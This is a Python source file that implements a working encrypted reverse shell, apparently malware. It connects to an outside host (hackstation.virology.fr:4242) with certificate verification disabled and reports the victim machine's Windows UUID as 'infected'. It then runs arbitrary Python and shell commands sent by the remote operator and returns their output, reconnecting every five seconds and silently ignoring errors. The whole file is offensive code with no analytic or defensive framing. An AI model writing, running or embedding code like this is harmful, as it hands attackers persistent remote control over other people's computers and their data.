import socket
import ssl
import sys
import threading
from io import StringIO
import contextlib
import os
import subprocess
from time import sleep

@contextlib.contextmanager
def stdoutIO(stdout=None):
    old = sys.stdout
    if stdout is None:
        stdout = StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = old

def execute_command(command, socket):    
    exec_globals = {
        'os': __import__('os'),
        'subprocess': subprocess,
    }

    def custom_os_system(cmd):
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.stdout:
            print(result.stdout.strip())
        if result.stderr:
            print(result.stderr.strip())
        return result.returncode

    exec_globals['os'].system = custom_os_system

    with stdoutIO() as o:
        try:
            exec(command, exec_globals)
        except Exception as e:
            socket.send(f"An error occurred during execution: {str(e)}".encode('utf-8'))
            return
        
        output = o.getvalue().strip()

    if output == "":
        output = "Success"
    
    socket.send(output.encode('utf-8'))

def revshell():
    while True:
        try:
            context = ssl.create_default_context()

            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            s = context.wrap_socket(raw_socket, server_hostname="hackstation.virology.fr")

            s.connect(("hackstation.virology.fr", 4242))
            uid = os.popen("powershell -Command \"Get-CimInstance -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID\"").read().strip().splitlines()[-1]
            s.send(f"infected|||{uid}|||".encode('utf-8'))

            while True:
                command = ""
                while True:
                    part = s.recv(1024).decode('utf-8')
                    if not part:
                        command = "exit"
                        break
                    command += part
                    if len(part) < 1024:
                        break

                if command.lower() == "exit":
                    break
                else:
                    thread = threading.Thread(target=execute_command, args=(command, s))
                    thread.start()
            
            s.close()
        except:
            pass
        sleep(5)

revshell()
